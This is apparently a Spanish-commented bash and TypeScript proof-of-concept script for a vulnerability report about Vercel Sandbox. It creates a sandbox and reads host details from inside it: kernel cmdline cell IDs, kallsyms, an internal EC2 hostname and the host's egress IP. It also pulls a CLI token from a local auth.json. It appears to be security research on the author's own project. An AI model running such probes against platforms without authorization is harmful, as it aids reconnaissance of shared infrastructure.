#!/usr/bin/env bash
#
# repro.sh — Replica completa del hallazgo "host implementation disclosure"
#
# Escenario origen -> victima:
#   1. Crea un sandbox victima (ubuntu, puerto 3000 expuesto)
#   2. Lee el leak de identidad/topologia del host DESDE DENTRO del sandbox (uid 1000, sin escape)
#   3. Desde el ORIGEN (esta maquina) traza la ruta y hace ingress al dominio publico del sandbox
#   4. Muestra el leak bajo deny-all (opcional)
#   5. Detiene el sandbox (cleanup)
#
# Requisitos:
#   - node >= 22 + @vercel/sandbox instalado (npm i @vercel/sandbox)
#   - Token OIDC del proyecto victima en victima/.env.local como VERCEL_OIDC_TOKEN=...
#
# Uso:
#   bash poc/repro.sh [--deny-all] [--stop-only]
#
set -u

cd "$(dirname "$0")/.."
ROOT="$(pwd)"

ENV_FILE="$ROOT/victima/.env.local"
if [[ -f "$ENV_FILE" ]]; then
  VICTIM=$(grep '^VERCEL_OIDC_TOKEN=' "$ENV_FILE" | head -1 | cut -d= -f2-)
fi
if [[ -z "$VICTIM" ]]; then
  # fallback: PAT del CLI (no expira)
  VICTIM=$(python3 -c "import json;print(json.load(open('$HOME/.local/share/com.vercel.cli/auth.json'))['token'])" 2>/dev/null)
fi
if [[ -z "$VICTIM" ]]; then
  echo "[!] No hay token. Usa victima/.env.local con VERCEL_OIDC_TOKEN=... o el CLI auth.json" >&2
  exit 1
fi
# teamId/projectId
TEAM_ID=$(echo "$VICTIM" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import json,sys;print(json.load(sys.stdin).get('owner_id',''))" 2>/dev/null)
PROJ_ID=$(echo "$VICTIM" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import json,sys;print(json.load(sys.stdin).get('project_id',''))" 2>/dev/null)
if [[ -z "$PROJ_ID" ]]; then
  # PAT no es JWT; usar proyecto fijo
  TEAM_ID="team_bi7zLiwN9ULZQklHh3rlmq7D"
  PROJ_ID="prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A"
fi
export VERCEL_SANDBOX_TEAM="$TEAM_ID"
export VERCEL_SANDBOX_PROJECT="$PROJ_ID"
echo "[token] $(echo "$VICTIM" | cut -c1-8)... (team=$TEAM_ID project=$PROJ_ID)"

MODE="allow-all"
for arg in "$@"; do
  case "$arg" in
    --deny-all) MODE="deny-all" ;;
    --stop-only) MODE="stop-only" ;;
  esac
done

# Valores extraidos por el script TS (se escriben a /tmp)
DOMAIN_FILE="/tmp/sbx_domain.txt"
LEAK_FILE="/tmp/sbx_leak.txt"
# nombre unico por ejecucion (el borrado en BD de Vercel puede no ser inmediato)
SBX_NAME="victim-repro-$(date +%s)"

cat > "$ROOT/poc/repro_victim.mts" << 'EOF'
import { Sandbox } from "@vercel/sandbox";
import { readFileSync, writeFileSync } from "fs";

function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}

const MODE = process.argv[2] ?? "allow-all";
const NAME = process.argv[3] ?? "victim-repro-" + Date.now();
let VICTIM = "";
try { VICTIM = readFileSync("/tmp/vercel-sandbox/victima/.env.local", "utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? ""; } catch {}
if (!VICTIM) { try { VICTIM = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json", "utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? ""; } catch {} }
if (!VICTIM) { console.error("no token"); process.exit(1); }
let V: any;
try {
  V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
} catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

const LEAK_CMD = `
set +e
echo "===== 1. UID (unprivileged) ====="
id
echo "===== 2. /proc/cmdline ====="
cat /proc/cmdline | tr ' ' '\\n' | grep -aiE "cell_id|build_version|ip="
echo "===== 3. dmesg (kernel build) ====="
dmesg 2>/dev/null | head -1
echo "===== 4. /proc/kallsyms ====="
head -1 /proc/kallsyms 2>/dev/null
echo "===== 5. resolv.conf ====="
cat /etc/resolv.conf 2>/dev/null
echo "===== 6. host VPC hostname -> IP ====="
getent hosts ip-172-31-16-7.ec2.internal 2>/dev/null | head -1
echo "===== 7. host egress public IP ====="
dig +short TXT o-o.myaddr.l.google.com @172.31.0.2 2>/dev/null | head -1
echo "===== 8. egress test (example.com) ====="
timeout 4 curl -s -o /dev/null -w "egress code=%{http_code}\\n" --max-time 3 https://example.com 2>&1 | tail -1
echo "===== DONE ====="
`;

async function main() {
  const creds = { token: VICTIM, teamId, projectId };

  if (MODE === "stop-only") {
    try {
      const s = await Sandbox.get({ name: process.argv[3] ?? NAME, ...creds });
      await s.stop();
      try { await s.delete(); console.log("sandbox detenido y eliminado"); }
      catch { console.log("sandbox detenido (delete no disponible)"); }
    } catch (e) {
      console.log("no sandbox para detener:", (e as Error).message);
    }
    return;
  }

  const sbx = await Sandbox.create({
    name: NAME,
    ...creds,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  if (MODE === "deny-all") {
    await sbx.updateNetworkPolicy("deny-all");
  }
  console.log("policy:", JSON.stringify(sbx.networkPolicy));

  const domain = sbx.domain(3000);
  writeFileSync("/tmp/sbx_domain.txt", domain);
  console.log("DOMAIN=" + domain);

  // listener para el test de ingress
  await sbx.runCommand("bash", ["-c", `python3 -m http.server 3000 --bind 0.0.0.0 >/tmp/srv.log 2>&1 & sleep 1; echo listener-ok`], { wait: true, timeout: 30_000 });

  const res = await sbx.runCommand("bash", ["-c", LEAK_CMD], { wait: true, timeout: 60_000 });
  const out = await res.output("both");
  writeFileSync("/tmp/sbx_leak.txt", out);
  console.log(out);

  console.log("KEEP_ALIVE=" + domain);
  // no detenemos: el sandbox sigue vivo para el test de ingress desde el origen
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
EOF

run_ts() {
  (cd "$ROOT" && node --experimental-strip-types "$ROOT/poc/repro_victim.mts" "$MODE" "$SBX_NAME") 2>&1
}

echo "############################################################"
echo "# 1) Creando sandbox victima (policy=$MODE) + leak desde dentro"
echo "############################################################"
run_ts | tee "$LEAK_FILE" | head -40

DOMAIN=$(cat "$DOMAIN_FILE" 2>/dev/null | sed -E 's#^https?://##')
if [[ -z "$DOMAIN" ]]; then
  echo "[!] No se obtuvo dominio del sandbox" >&2
  exit 1
fi
echo ""
echo "############################################################"
echo "# 2) ORIGEN -> VICTIMA: ruta de red hacia $DOMAIN"
echo "############################################################"
traceroute -n -w 1 -q 1 -m 10 "$DOMAIN" 2>&1 | head -12

echo ""
echo "############################################################"
echo "# 3) ORIGEN -> VICTIMA: ingress al puerto expuesto"
echo "############################################################"
echo "--- DNS ---"
getent hosts "$DOMAIN"
echo "--- HTTP (redirect a https) ---"
curl -s -o /dev/null -w "http code=%{http_code} location=%{redirect_url}\n" --max-time 10 "http://$DOMAIN/" 2>&1 | tail -1
echo "--- HTTPS ---"
curl -s -i --max-time 10 "https://$DOMAIN/" 2>&1 | head -12

echo ""
echo "############################################################"
echo "# 4) Leak guardado en: $LEAK_FILE"
echo "#    (parte del escenario se repite bajo deny-all con --deny-all)"
echo "############################################################"

echo ""
echo "limpiando..."
node --experimental-strip-types "$ROOT/poc/repro_victim.mts" stop-only "$SBX_NAME" 2>&1 | tail -1
echo "[done]"